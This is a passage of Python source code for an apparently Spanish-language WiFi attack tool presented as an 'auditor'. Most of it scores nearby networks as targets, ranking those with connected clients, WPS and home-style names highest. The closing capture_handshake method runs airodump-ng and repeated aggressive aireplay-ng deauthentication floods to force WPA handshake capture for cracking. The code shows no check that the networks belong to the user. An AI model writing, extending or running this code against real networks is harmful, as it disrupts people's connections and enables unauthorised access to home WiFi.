        """Seleccionar objetivos para auditar"""
        if not self.targets:
            return []
        
        # Solo modo automático si se solicita explícitamente
        if auto_mode:
            return self.intelligent_target_selection()
        
        # Modo manual simplificado - una sola oportunidad
        return self.single_chance_selection()
    
    def single_chance_selection(self):
        """Selección simplificada con una sola oportunidad"""
        if not self.targets:
            self.log("No hay objetivos disponibles", "WARNING")
            return []
        
        self.log(f"Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
        self.display_targets()
        
        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
        print(f"1-{len(self.targets)}. Seleccionar por números (ej: 1,3,5)")
        print(f"{Colors.GREEN}clients. Solo redes con clientes (RECOMENDADO){Colors.END}")
        print("all. Todos los objetivos")
        print("wps. Solo redes con WPS")
        print("q. Salir")
        
        try:
            # Una sola oportunidad de selección
            choice = self.safe_input(
                f"\n{Colors.CYAN}Tu selección: {Colors.END}",
                default="clients",  # Por defecto redes con clientes
                allow_empty=False
            ).lower().strip()
            
            if not choice or choice == 'q':
                self.log("Selección cancelada", "WARNING")
                return []
            
            # Procesar la selección
            selected = self.process_simple_selection(choice)
            
            if not selected:
                self.log("No se pudo procesar la selección - usando modo automático", "WARNING")
                return self.automatic_fallback_selection()
            
            # Mostrar selección y confirmar UNA SOLA VEZ
            self.show_simple_preview(selected)
            
            confirm = self.safe_input(
                f"\n{Colors.YELLOW}¿Proceder? (s/n): {Colors.END}",
                default="s",  # Por defecto sí
                allow_empty=False
            ).lower()
            
            if confirm in ['s', 'si', 'y', 'yes', '']:
                self.log(f"Confirmados {len(selected)} objetivos", "SUCCESS")
                return selected
            else:
                self.log("Selección rechazada - usando modo automático", "INFO")
                return self.automatic_fallback_selection()
                
        except (KeyboardInterrupt, EOFError):
            self.log("Operación cancelada - usando modo automático", "WARNING")
            return self.automatic_fallback_selection()
        except Exception as e:
            self.log(f"Error en selección: {e} - usando modo automático", "ERROR")
            return self.automatic_fallback_selection()
    
    def process_simple_selection(self, choice):
        """Procesar selección de forma simple"""
        selected = []
        
        if choice == 'clients':
            selected = [t for t in self.targets if t['clients'] > 0]
            selected = sorted(selected, key=lambda x: x['clients'], reverse=True)[:5]
            if selected:
                self.log(f"Seleccionadas {len(selected)} redes con clientes", "SUCCESS")
            else:
                self.log("No hay redes con clientes - seleccionando mejores por señal", "WARNING")
                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:3]
        
        elif choice == 'all':
            selected = self.targets.copy()
            self.log(f"Seleccionadas TODAS las {len(selected)} redes", "INFO")
        
        elif choice == 'wps':
            selected = [t for t in self.targets if 'WPS' in t['encryption']]
            if selected:
                self.log(f"Seleccionadas {len(selected)} redes WPS", "SUCCESS")
            else:
                self.log("No hay redes WPS - usando selección por clientes", "WARNING")
                selected = [t for t in self.targets if t['clients'] > 0][:3]
        
        else:
            # Números específicos
            try:
                if ',' in choice or choice.isdigit():
                    indices = []
                    for num_str in choice.replace(' ', '').split(','):
                        if num_str.isdigit():
                            num = int(num_str)
                            if 1 <= num <= len(self.targets):
                                indices.append(num - 1)
                    
                    if indices:
                        selected = [self.targets[i] for i in indices]
                        self.log(f"Seleccionadas {len(selected)} redes manualmente", "SUCCESS")
            except:
                pass
        
        return selected
    
    def show_simple_preview(self, selected_targets):
        """Mostrar vista previa simple"""
        if not selected_targets:
            return
            
        print(f"\n{Colors.BOLD}OBJETIVOS SELECCIONADOS:{Colors.END}")
        print("-" * 50)
        
        for i, target in enumerate(selected_targets, 1):
            clients_info = f"{target['clients']} clientes" if target['clients'] > 0 else "sin clientes"
            color = Colors.GREEN if target['clients'] > 0 else Colors.YELLOW
            print(f"{color}{i}. {target['essid']} ({target['power']}dBm, {clients_info}){Colors.END}")
        
        print("-" * 50)
        print(f"Total: {len(selected_targets)} redes")
    
    def intelligent_target_selection(self):
        """Selección automática inteligente de objetivos"""
        self.log("=== SELECCIÓN AUTOMÁTICA INTELIGENTE ACTIVADA ===", "INFO")
        self.display_targets()
        
        # Algoritmo de selección inteligente
        scored_targets = []
        
        for target in self.targets:
            score = 0
            reasons = []
            
            # Factor 1: Clientes conectados (MUY IMPORTANTE)
            if target['clients'] > 0:
                score += target['clients'] * 50  # 50 puntos por cliente
                reasons.append(f"{target['clients']} clientes")
            
            # Factor 2: Fuerza de señal
            signal_score = max(0, target['power'] + 100)  # Convertir -70 a 30 puntos
            score += signal_score
            reasons.append(f"señal {target['power']}dBm")
            
            # Factor 3: Tipo de encriptación (WPS es más fácil)
            if 'WPS' in target['encryption']:
                score += 100
                reasons.append("WPS habilitado")
            elif 'WPA2' in target['encryption']:
                score += 30
                reasons.append("WPA2")
            elif 'WPA' in target['encryption']:
                score += 20
                reasons.append("WPA")
            
            # Factor 4: Nombre del ESSID (patrones comunes)
            essid_lower = target['essid'].lower()
            if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home', 'wifi']):
                score += 25
                reasons.append("nombre común")
            
            # Factor 5: Penalizar redes corporativas/públicas
            if any(corp in essid_lower for corp in ['guest', 'public', 'free', 'hotspot']):
                score -= 50
                reasons.append("red pública")
            
            scored_targets.append({
                'target': target,
                'score': score,
                'reasons': reasons
            })
        
        # Ordenar por puntuación
        scored_targets.sort(key=lambda x: x['score'], reverse=True)
        
        # Seleccionar los mejores objetivos
        selected = []
        max_targets = self.config.get('max_auto_targets', 5)
        min_score = 50  # Puntuación mínima para considerar objetivo
        
        self.log(f"\n=== ANÁLISIS DE OBJETIVOS ===\n", "INFO")
        for i, scored in enumerate(scored_targets[:10]):
            target = scored['target']
            score = scored['score']
            reasons = ', '.join(scored['reasons'])
            
            status = "SELECCIONADO" if score >= min_score and len(selected) < max_targets else "DESCARTADO"
            color = Colors.GREEN if status == "SELECCIONADO" else Colors.RED
            
            self.log(f"{color}{target['essid']:20} | Score: {score:3d} | {reasons} | {status}{Colors.END}", "INFO")
            
            if score >= min_score and len(selected) < max_targets:
                selected.append(target)
        
        # Si no hay objetivos con buena puntuación, tomar los mejores disponibles
        if not selected and scored_targets:
            self.log("No hay objetivos ideales, seleccionando los mejores disponibles...", "WARNING")
            selected = [scored['target'] for scored in scored_targets[:3]]
        
        if selected:
            self.log(f"\n=== OBJETIVOS SELECCIONADOS AUTOMÁTICAMENTE: {len(selected)} ===\n", "SUCCESS")
            for i, target in enumerate(selected, 1):
                self.log(f"{i}. {target['essid']} ({target['clients']} clientes, {target['power']}dBm)", "SUCCESS")
        else:
            self.log("No se pudieron seleccionar objetivos automáticamente", "ERROR")
        
        return selected
    
    def manual_target_selection_with_intelligence(self):
        """Selección manual con información visual inteligente"""
        self.display_targets_with_difficulty_info()
        
        print(f"\n{Colors.BOLD}Código de colores:{Colors.END}")
        print(f"{Colors.GREEN}● FÁCIL{Colors.END}    - Redes con clientes conectados (alta probabilidad de éxito)")
        print(f"{Colors.YELLOW}● MEDIO{Colors.END}   - Buena señal pero sin clientes (probabilidad media)")
        print(f"{Colors.RED}● DIFÍCIL{Colors.END}  - Señal débil y sin clientes (baja probabilidad)")
        print(f"{Colors.PURPLE}● WPS{Colors.END}     - WPS habilitado (muy fácil si funciona)")
        
        # Continuar con la selección manual
        return self.get_manual_selection()
    
    def display_targets_with_difficulty_info(self):
        """Mostrar objetivos con información de dificultad y probabilidad"""
        if not self.targets:
            self.log("No hay objetivos disponibles", "WARNING")
            return
        
        # Calcular scores para cada objetivo (mismo algoritmo que el modo auto)
        scored_targets = []
        for i, target in enumerate(self.targets, 1):
            score = self.calculate_target_score(target)
            difficulty = self.get_difficulty_level(target, score)
            scored_targets.append({
                'index': i,
                'target': target,
                'score': score,
                'difficulty': difficulty
            })
        
        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}Redes WiFi encontradas (ordenadas por dificultad):{Colors.END}")
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<3} {'PWR':<4} {'CLI':<4} {'ENC':<10} {'DIFICULTAD':<15} {'PROBABILIDAD'}")
        print("-" * 100)
        
        # Ordenar por dificultad (fáciles primero)
        scored_targets.sort(key=lambda x: (-x['score'], x['target']['essid']))
        
        for item in scored_targets:
            target = item['target']
            difficulty = item['difficulty']
            index = item['index']
            
            # Color según dificultad
            if difficulty['level'] == 'FACIL':
                color = Colors.GREEN
                probability = "🔥 ALTA (80-95%)"
            elif difficulty['level'] == 'WPS':
                color = Colors.PURPLE  
                probability = "⚡ MUY ALTA (90%+)"
            elif difficulty['level'] == 'MEDIO':
                color = Colors.YELLOW
                probability = "🟡 MEDIA (40-60%)"
            else:  # DIFICIL
                color = Colors.RED
                probability = "🔴 BAJA (10-30%)"
            
            print(f"{color}{index:<3} {target['essid']:<25} {target['bssid']:<18} "
                  f"{target['channel']:<3} {target['power']:<4} {target['clients']:<4} {target['encryption']:<10} "
                  f"{difficulty['level']:<15} {probability}{Colors.END}")
            
            # Mostrar razones de la dificultad
            if difficulty['reasons']:
                reasons_text = ' | '.join(difficulty['reasons'])
                print(f"    → {Colors.CYAN}{reasons_text}{Colors.END}")
    
    def calculate_target_score(self, target):
        """Calcular score de un objetivo (reutiliza lógica del modo auto)"""
        score = 0
        
        # Factor 1: Clientes conectados (MUY IMPORTANTE)
        if target['clients'] > 0:
            score += target['clients'] * 50
        
        # Factor 2: Fuerza de señal
        signal_score = max(0, target['power'] + 100)
        score += signal_score
        
        # Factor 3: Tipo de encriptación
        if 'WPS' in target['encryption']:
            score += 100
        elif 'WPA2' in target['encryption']:
            score += 30
        elif 'WPA' in target['encryption']:
            score += 20
        
        # Factor 4: Nombre del ESSID
        essid_lower = target['essid'].lower()
        if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home', 'wifi']):
            score += 25
        
        # Factor 5: Penalizar redes corporativas
        if any(corp in essid_lower for corp in ['guest', 'public', 'free', 'hotspot']):
            score -= 50
        
        return max(0, score)
    
    def get_difficulty_level(self, target, score):
        """Determinar nivel de dificultad y razones"""
        reasons = []
        
        # Determinar nivel basado en score y características
        if 'WPS' in target['encryption'] and score > 100:
            level = 'WPS'
            reasons.append('WPS habilitado')
        elif target['clients'] > 0 and score >= 100:
            level = 'FACIL'
            reasons.append(f"{target['clients']} clientes conectados")
            if target['power'] > -60:
                reasons.append('excelente señal')
        elif target['power'] > -60 and score >= 60:
            level = 'MEDIO'
            reasons.append('buena señal')
            if target['clients'] == 0:
                reasons.append('sin clientes activos')
        else:
            level = 'DIFICIL'
            if target['power'] <= -70:
                reasons.append('señal débil')
            if target['clients'] == 0:
                reasons.append('sin clientes')
        
        # Añadir información sobre ESSID
        essid_lower = target['essid'].lower()
        if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home']):
            reasons.append('nombre común (+ fácil)')
        
        return {
            'level': level,
            'reasons': reasons
        }
    
    def manual_target_selection(self):
        """Selección manual simple (modo legacy)"""
        self.display_targets()
        
        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
        print(f"1. {Colors.BOLD}Números específicos{Colors.END} (ej: 1,3,5) - Elige manualmente")
        print(f"2. {Colors.GREEN}Solo redes FÁCILES{Colors.END} (con clientes) - {Colors.BOLD}RECOMENDADO{Colors.END}")
        print(f"3. {Colors.PURPLE}Solo redes WPS{Colors.END} (si las hay) - Más fácil")
        print(f"4. {Colors.YELLOW}Todas las redes{Colors.END} (all) - Para expertos")
        print(f"5. {Colors.CYAN}Top 5 por señal{Colors.END} (top5) - Mejores señales")
        print(f"6. {Colors.RED}Modo automático{Colors.END} (auto) - Deja que el sistema elija")
        
        print(f"\n{Colors.BOLD}Consejo:{Colors.END} Para máximo éxito, elige redes {Colors.GREEN}VERDES{Colors.END} (fáciles) primero")
        
        try:
            choice = self.safe_input(
                f"\n{Colors.BOLD}Tu selección:{Colors.END} ",
                default="clients",  # Opción más segura por defecto
                allow_empty=False
            ).lower()
            if not choice:
                self.log("Selección vacía - usando 'clients' por defecto", "WARNING")
                choice = "clients"
            selected = []
            
            if choice == 'auto':
                return self.intelligent_target_selection()
            elif choice == 'all':
                selected = self.targets.copy()
                self.log(f"Seleccionadas TODAS las {len(selected)} redes", "WARNING")
            elif choice == 'top5':
                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
                self.log(f"Seleccionadas top 5 redes por señal", "INFO")
            elif choice == 'wps' or choice == '3':
                selected = [t for t in self.targets if 'WPS' in t['encryption']]
                if selected:
                    self.log(f"Encontradas {len(selected)} redes con WPS habilitado", "SUCCESS")
                else:
                    self.log("No se encontraron redes con WPS", "WARNING")
            elif choice in ['clients', '2', 'facil', 'fácil']:
                # Solo redes fáciles (con clientes conectados)
                selected = [t for t in self.targets if t['clients'] > 0]
                selected = sorted(selected, key=lambda x: x['clients'], reverse=True)
                if selected:
                    self.log(f"\u2728 Encontradas {len(selected)} redes FÁCILES con clientes activos", "SUCCESS")
                    for i, target in enumerate(selected[:3], 1):
                        self.log(f"  {i}. {target['essid']} ({target['clients']} clientes, {target['power']}dBm)", "SUCCESS")
                else:
                    self.log("No se encontraron redes con clientes conectados - Modo difícil activado", "WARNING")
                    return self.select_backup_targets()
            elif choice in ['1'] or any(c.isdigit() or c == ',' for c in choice):
                # Números específicos
                indices = []
                for x in choice.replace(' ', '').split(','):
                    if x.strip().isdigit():
                        indices.append(int(x.strip()) - 1)
                
                selected = [self.targets[i] for i in indices if 0 <= i < len(self.targets)]
                if selected:
                    self.log(f"Seleccionadas {len(selected)} redes manualmente:", "INFO")
                    for target in selected:
                        difficulty = self.get_difficulty_level(target, self.calculate_target_score(target))
                        color = Colors.GREEN if difficulty['level'] == 'FACIL' else Colors.YELLOW if difficulty['level'] == 'MEDIO' else Colors.RED
                        self.log(f"  → {color}{target['essid']} ({difficulty['level']}){Colors.END}", "INFO")
                else:
                    self.log("Selección inválida, intentando otra vez...", "ERROR")
                    return self.manual_target_selection_with_intelligence()
            else:
                self.log("Opción no reconocida, mostrando ayuda...", "WARNING")
                return self.manual_target_selection_with_intelligence()
            
            if not selected:
                self.log("Ninguna red seleccionada", "WARNING")
                return []
            
            return selected
        
        except Exception as e:
            self.log(f"Error en selección: {e}", "ERROR")
            return self.manual_target_selection_with_intelligence()
    
    def select_backup_targets(self):
        """Seleccionar objetivos cuando no hay redes fáciles"""
        self.log("\n=== MODO DIFÍCIL ACTIVADO ===", "WARNING")
        self.log("No hay redes con clientes conectados. Seleccionando mejores alternativas...", "INFO")
        
        # Buscar redes con WPS primero
        wps_targets = [t for t in self.targets if 'WPS' in t['encryption']]
        if wps_targets:
            self.log(f"\u2728 Encontradas {len(wps_targets)} redes con WPS - Intentando estas primero", "SUCCESS")
            return sorted(wps_targets, key=lambda x: x['power'], reverse=True)[:3]
        
        # Si no hay WPS, tomar las de mejor señal
        best_signal = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
        self.log(f"Seleccionando {len(best_signal)} redes con mejor señal (modo experto)", "INFO")
        
        return best_signal
    
    def get_manual_selection(self):
        """Obtener selección manual del usuario estilo Wifite"""
        print(f"\n{Colors.BOLD}Selecciona los objetivos a atacar:{Colors.END}")
        print(f"Ejemplo: {Colors.CYAN}1{Colors.END} (una red) o {Colors.CYAN}1,2,14{Colors.END} (múltiples redes)")
        print(f"Opciones especiales: {Colors.GREEN}facil{Colors.END} | {Colors.PURPLE}wps{Colors.END} | {Colors.YELLOW}all{Colors.END}")
        
        try:
            while True:
                choice = self.safe_input(
                    f"\n{Colors.BOLD}[+] Selección:{Colors.END} ",
                    default="facil",  # Opción más segura por defecto
                    allow_empty=False
                ).lower()
                if not choice:
                    self.log("Selección vacía - usando 'facil' por defecto", "WARNING")
                    choice = "facil"
                
                if not choice:
                    print(f"{Colors.RED}[!] Por favor ingresa una selección{Colors.END}")
                    continue
                
                # Procesar selección
                selected = self.process_user_selection(choice)
                if selected:
                    return selected
                else:
                    print(f"{Colors.RED}[!] Selección inválida, inténtalo de nuevo{Colors.END}")
                    continue
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Operación cancelada por el usuario{Colors.END}")
            return []
    
    def process_user_selection(self, choice):
        """Procesar la selección del usuario"""
        selected = []
        
        # Opciones especiales
        if choice in ['facil', 'fácil', 'easy']:
            selected = [t for t in self.targets if t['clients'] > 0]
            if selected:
                self.log(f"[+] Seleccionadas {len(selected)} redes FÁCILES (con clientes)", "SUCCESS")
            else:
                print(f"{Colors.RED}[!] No hay redes fáciles disponibles{Colors.END}")
                return None
        
        elif choice in ['wps']:
            selected = [t for t in self.targets if 'WPS' in t['encryption']]
            if selected:
                self.log(f"[+] Seleccionadas {len(selected)} redes con WPS", "SUCCESS")
            else:
                print(f"{Colors.RED}[!] No hay redes con WPS disponibles{Colors.END}")
                return None
        
        elif choice in ['all', 'todas']:
            selected = self.targets.copy()
            self.log(f"[+] Seleccionadas TODAS las {len(selected)} redes", "WARNING")
        
        else:
            # Números específicos (estilo Wifite)
            try:
                # Limpiar y dividir la entrada
                numbers = []
                for num_str in choice.replace(' ', '').split(','):
                    if num_str.isdigit():
                        numbers.append(int(num_str))
                
                if not numbers:
                    return None
                
                # Validar y obtener redes
                for num in numbers:
                    if 1 <= num <= len(self.targets):
                        target = self.targets[num - 1]  # -1 porque mostramos desde 1
                        selected.append(target)
                    else:
                        print(f"{Colors.RED}[!] Número {num} fuera de rango (1-{len(self.targets)}){Colors.END}")
                        return None
                
                if selected:
                    self.log(f"[+] Seleccionadas {len(selected)} redes manualmente:", "SUCCESS")
                    for i, target in enumerate(selected, 1):
                        difficulty = self.get_difficulty_level(target, self.calculate_target_score(target))
                        color = self.get_difficulty_color(difficulty['level'])
                        print(f"    {i}. {color}{target['essid']}{Colors.END} ({difficulty['level']})")
                        
            except ValueError:
                return None
        
        return selected if selected else None
    
    def get_difficulty_color(self, level):
        """Obtener color según nivel de dificultad"""
        if level == 'FACIL':
            return Colors.GREEN
        elif level == 'WPS':
            return Colors.PURPLE
        elif level == 'MEDIO':
            return Colors.YELLOW
        else:
            return Colors.RED
    
    def simple_target_selection(self):
        """Selección mejorada de objetivos con vista previa"""
        if not self.targets:
            self.log("No hay objetivos disponibles para selección", "WARNING")
            return []
        
        self.log(f"Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
        self.display_targets()
        
        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
        print(f"1-{len(self.targets)}. Seleccionar por números (ej: 1,3,5)")
        print("all. Todos los objetivos")
        print("top5. Top 5 por señal")
        print("wps. Solo redes con WPS")
        print(f"{Colors.GREEN}clients. Solo redes con clientes (RECOMENDADO){Colors.END}")
        print("q. Salir")
        
        selection_attempts = 0
        max_attempts = 3  # Máximo 3 intentos
        
        while selection_attempts < max_attempts:
            selection_attempts += 1
            self.log(f"Intento de selección {selection_attempts}/{max_attempts}", "INFO")
            
            try:
                # PASO 1: Obtener selección
                try:
                    # Intentar con método robusto primero
                    self.log("Esperando selección del usuario...", "INFO")
                    choice = self.robust_input(f"\n{Colors.CYAN}Tu selección: {Colors.END}")
                except EOFError:
                    self.log("No se pudo obtener entrada del usuario - cancelando selección", "ERROR")
                    print(f"\n{Colors.RED}⚠️ No se pudo leer entrada. Posibles soluciones:{Colors.END}")
                    print(f"  1. Ejecutar en terminal interactivo")
                    print(f"  2. Verificar que no está redirigido stdin")
                    print(f"  3. Usar: python3 wifi_auditor_pro.py directamente")
                    
                    # Ofrecer modo automático como fallback
                    print(f"\n{Colors.YELLOW}Intentando selección automática...{Colors.END}")
                    return self.automatic_fallback_selection()
                except KeyboardInterrupt:
                    self.log("Operación cancelada por el usuario (Ctrl+C)", "WARNING")
                    return []
                
                # Validar que no esté vacío
                if not choice:
                    print(f"{Colors.YELLOW}Por favor ingresa una opción válida.{Colors.END}")
                    continue
                    
                if choice.lower() == 'q':
                    self.log("Operación cancelada por el usuario", "WARNING")
                    return []
                
                # Procesar selección y mostrar vista previa
                self.log(f"🔍 Procesando selección: '{choice}'", "INFO")
                preview_selected = self.process_selection_preview(choice)
                
                if preview_selected is None:
                    print(f"{Colors.RED}❌ Selección inválida. Inténtalo de nuevo.{Colors.END}")
                    print(f"{Colors.CYAN}Opciones válidas: 1-{len(self.targets)}, 'clients', 'all', 'wps', 'top5', 'q'{Colors.END}")
                    continue
                
                if not preview_selected:
                    print(f"{Colors.YELLOW}⚠️ No hay redes que coincidan con tu selección '{choice}'.{Colors.END}")
                    print(f"{Colors.CYAN}Prueba con otras opciones como 'clients' o 'all'{Colors.END}")
                    continue
                
                # Mostrar vista previa
                self.show_selection_preview(preview_selected)
                
                # PASO 2: Bucle separado para confirmación
                while True:
                    try:
                        confirm = self.safe_input(
                            f"\n{Colors.YELLOW}¿Proceder con estos objetivos? (s/n): {Colors.END}",
                            default="n",  # Valor por defecto en caso de EOF
                            allow_empty=False
                        ).lower()
                        if not confirm:  # EOF manejado por safe_input
                            self.log("Confirmación vacía - usando valor por defecto 'no'", "WARNING")
                            confirm = "n"
                        
                        if confirm in ['s', 'si', 'y', 'yes']:
                            self.log(f"Confirmados {len(preview_selected)} objetivos", "SUCCESS")
                            return preview_selected
                        elif confirm in ['n', 'no']:
                            if selection_attempts >= max_attempts:
                                self.log(f"Máximo de {max_attempts} intentos alcanzado - usando selección automática", "WARNING")
                                return self.automatic_fallback_selection()
                            else:
                                print(f"{Colors.BLUE}Volviendo a selección... (Intento {selection_attempts}/{max_attempts}){Colors.END}")
                                break  # Salir del bucle de confirmación, volver al de selección
                        else:
                            print(f"{Colors.RED}Respuesta inválida. Por favor responde 's' o 'n'{Colors.END}")
                            continue
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                        return []
                
            except EOFError:
                self.log("EOF detectado en bucle principal - saliendo", "WARNING")
                return []
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                return []
            except Exception as e:
                self.log(f"Error inesperado en selección: {str(e)}", "ERROR")
                if hasattr(e, '__traceback__'):
                    import traceback
                    self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
                
                # Preguntar al usuario si quiere continuar
                try:
                    retry = self.safe_input(
                        f"\n{Colors.YELLOW}¿Intentar de nuevo? (s/n): {Colors.END}",
                        default="n",  # Por defecto no reintentar
                        allow_empty=False
                    ).lower()
                    if not retry or retry not in ['s', 'si', 'y', 'yes']:
                        return []
                except KeyboardInterrupt:
                    return []
                continue
        
        # Si llegamos aquí, se agotaron los intentos
        self.log(f"Se agotaron los {max_attempts} intentos de selección manual", "WARNING")
        self.log("Activando selección automática como fallback final...", "INFO")
        return self.automatic_fallback_selection()
    
    def process_selection_preview(self, choice):
        """Procesar selección y devolver lista para vista previa"""
        # DEBUG: Agregar información de debug
        if self.config.get('verbose', True):
            self.log(f"🔧 DEBUG: Procesando selección '{choice}' con {len(self.targets)} targets", "INFO")
        
        choice = choice.lower().strip()
        selected = []
        
        # Verificación de estado
        if not self.targets:
            self.log("⚠️ No hay targets disponibles para seleccionar", "ERROR")
            return None
        
        try:
            if choice == 'all':
                selected = self.targets.copy()
                self.log(f"✅ Seleccionados TODOS los {len(selected)} targets", "INFO")
                
            elif choice == 'top5':
                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
                self.log(f"✅ Seleccionados top 5 por señal: {len(selected)} targets", "INFO")
                
            elif choice == 'wps':
                selected = [t for t in self.targets if 'WPS' in t['encryption'] or 'WPS' in t.get('extra_info', '')]
                self.log(f"✅ Seleccionados {len(selected)} targets con WPS", "INFO")
                
            elif choice == 'clients':
                # Solo redes con clientes conectados
                selected = [t for t in self.targets if t['clients'] > 0]
                selected = sorted(selected, key=lambda x: x['clients'], reverse=True)
                self.log(f"✅ Seleccionados {len(selected)} targets con clientes", "INFO")
                
            else:
                # Números específicos
                if ',' in choice or choice.isdigit():
                    if self.config.get('verbose', True):
                        self.log(f"🔍 Detectando números en: {choice}", "INFO")
                    
                    indices = []
                    for num_str in choice.replace(' ', '').split(','):
                        if num_str.isdigit():
                            num = int(num_str)
                            if self.config.get('verbose', True):
                                self.log(f"  - Procesando número: {num}", "INFO")
                            
                            if 1 <= num <= len(self.targets):
                                indices.append(num - 1)  # Convertir a índice base 0
                                if self.config.get('verbose', True):
                                    self.log(f"    ✅ Número {num} válido (rango 1-{len(self.targets)})", "INFO")
                            else:
                                self.log(f"❌ Número {num} fuera de rango (1-{len(self.targets)})", "ERROR")
                                return None
                        else:
                            self.log(f"❌ '{num_str}' no es un número válido", "ERROR")
                            return None
                    
                    if indices:
                        selected = [self.targets[i] for i in indices]
                        self.log(f"✅ Seleccionados {len(selected)} targets por números: {[i+1 for i in indices]}", "SUCCESS")
                        
                        # DEBUG: Mostrar targets seleccionados
                        if self.config.get('verbose', True):
                            for i, target in enumerate(selected):
                                self.log(f"  - Target {i+1}: {target['essid']}", "INFO")
                    else:
                        self.log("❌ No se encontraron números válidos", "ERROR")
                        return None
                else:
                    self.log(f"❌ Opción '{choice}' no reconocida", "ERROR")
                    return None  # Selección inválida
            
            return selected
            
        except Exception as e:
            self.log(f"❌ Error procesando selección: {e}", "ERROR")
            import traceback
            self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
            return None
    
    def show_selection_preview(self, selected_targets):
        """Mostrar vista previa de los objetivos seleccionados"""
        print(f"\n{Colors.BOLD}🎯 OBJETIVOS SELECCIONADOS:{Colors.END}")
        print("─" * 70)
        
        total_clients = sum(t['clients'] for t in selected_targets)
        avg_power = sum(t['power'] for t in selected_targets) / len(selected_targets)
        
        for i, target in enumerate(selected_targets, 1):
            # Determinar color según dificultad
            if target['clients'] > 0:
                color = Colors.GREEN
                difficulty = "FÁCIL"
            elif target['power'] > -60:
                color = Colors.YELLOW 
                difficulty = "MEDIO"
            else:
                color = Colors.RED
                difficulty = "DIFÍCIL"
            
            client_info = f"{Colors.GREEN}👥{target['clients']}{Colors.END}" if target['clients'] > 0 else f"{Colors.RED}👥{target['clients']}{Colors.END}"
            power_info = f"{target['power']}dBm"
            
            # Limpiar y truncar ESSID de forma segura
            safe_essid = str(target.get('essid', 'Unknown'))[:30].ljust(30)
            
            print(f"{i:2d}. {color}{safe_essid}{Colors.END} | {power_info:8} | {client_info} | {color}{difficulty}{Colors.END}")
        
        print("─" * 70)
        print(f"📊 Estadísticas: {len(selected_targets)} redes | {total_clients} clientes total | {avg_power:.0f}dBm promedio")
        
        # Recomendación
        easy_count = len([t for t in selected_targets if t['clients'] > 0])
        if easy_count > 0:
            print(f"{Colors.GREEN}✅ {easy_count} redes FÁCILES (con clientes) - ¡Excelente elección!{Colors.END}")
        elif len(selected_targets) <= 3:
            print(f"{Colors.YELLOW}⚠️ Redes sin clientes - será más lento, pero factible{Colors.END}")
        else:
            print(f"{Colors.RED}⚠️ Muchas redes difíciles - considera reducir la selección{Colors.END}")

    def capture_handshake(self, target):
        """Capturar handshake WPA/WPA2 - Método simple y eficiente"""
        self.log(f"Capturando handshake para {target['essid']} (Canal {target['channel']})", "INFO")
        
        if target['clients'] == 0:
            self.log(f"Sin clientes detectados - este target puede ser difícil", "WARNING")
        
        # Archivo de captura
        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
        capture_file = self.handshake_dir / capture_filename
        
        # Cambiar a canal del objetivo
        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
        self.log(f"Canal fijado en: {target['channel']}", "INFO")
        
        # Iniciar airodump-ng para captura
        dump_command = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file}"
        dump_process = subprocess.Popen(dump_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Esperar un poco antes de deauth
        time.sleep(3)
        
        # Primero, buscar clientes conectados al AP
        self.log("Escaneando clientes conectados al AP...", "INFO")
        client_scan_command = f"timeout 10 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} --write /tmp/client_scan"
        self.run_command(client_scan_command)
        
        # Ataque de deautenticación
        deauth_packets = self.config.get('deauth_packets', 10)
        deauth_command = f"aireplay-ng -0 {deauth_packets} -a {target['bssid']} {self.monitor_interface}"
        self.log("Enviando paquetes de deautenticación para forzar reconexiones...", "INFO")
        
        # Ejecutar deauth de forma más agresiva
        self.log("Ejecutando ataques de deautenticación agresivos hasta capturar handshake...", "INFO")
        
        handshake_captured = False
        max_attempts = 20  # Más intentos
        
        for attempt in range(max_attempts):
            self.log(f"Intento {attempt + 1}/{max_attempts} de deautenticación AGRESIVA", "INFO")
            
            # Estrategias múltiples para capturar EAPOL
            deauth_strategies = [
                f"aireplay-ng -0 5 -a {target['bssid']} {self.monitor_interface}",   # Deauth suave
                f"aireplay-ng -0 10 -a {target['bssid']} {self.monitor_interface}",  # Deauth normal
                f"aireplay-ng -0 20 -a {target['bssid']} {self.monitor_interface}",  # Deauth agresivo
                f"aireplay-ng -0 1 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {self.monitor_interface}", # Broadcast
            ]
            
            # Ejecutar estrategias con pausas para permitir reconexiones
            for i, strategy in enumerate(deauth_strategies):
                self.log(f"Estrategia de deauth {i+1}/{len(deauth_strategies)}", "INFO")
                subprocess.Popen(strategy, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)  # Pausa más larga para permitir reconexiones
            
            # Esperar y verificar si ya tenemos handshake
            time.sleep(10)
            
            # Verificar si ya capturamos handshake con EAPOL data
            cap_file_check = f"{capture_file}-01.cap"
            if os.path.exists(cap_file_check):
                success, output, _ = self.run_command(f"aircrack-ng {cap_file_check}")
                
                # Verificar que hay handshake Y que aircrack puede procesarlo
                if "WPA (1 handshake)" in output or "handshakes" in output.lower():
                    # Verificar que NO hay el error de "no EAPOL data"
                    if "no EAPOL data" not in output and "unable to process" not in output:
                        handshake_captured = True
